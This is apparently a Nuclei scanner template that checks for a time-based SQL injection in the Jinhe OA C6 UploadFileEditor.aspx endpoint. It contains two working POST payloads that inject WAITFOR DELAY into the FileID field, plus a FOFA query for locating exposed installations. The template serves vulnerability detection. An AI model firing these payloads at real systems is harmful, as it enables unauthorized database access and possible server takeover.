http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /C6/Control/UploadFileEditor.aspx HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded

          FileID=1';WAITFOR+DELAY'0:0:4'--+
        - |
          POST /C6/Control/UploadFileEditor.aspx HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded

          FileID=1';WAITFOR+DELAY'0:0:8'--+
id: jinheOA-C6-UploadFileEditor_aspx-sql
info:
    author: Superhero
    description: |-
        fofa: body="c6/Jhsoft.Web.login"
        金和OA C6 UploadFileEditor.aspx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 金和OA C6 UploadFileEditor.aspx SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486549&idx=1&sn=54e990447a5e509952737d9317e14fc0&chksm=c267b966f5103070a82843d8ca5bdd42325538ac37349800fde58ca81fc5679bea83163222e0&token=1628549949&lang=zh_CN#rd
    severity: high
    tags:
        - 金和oa
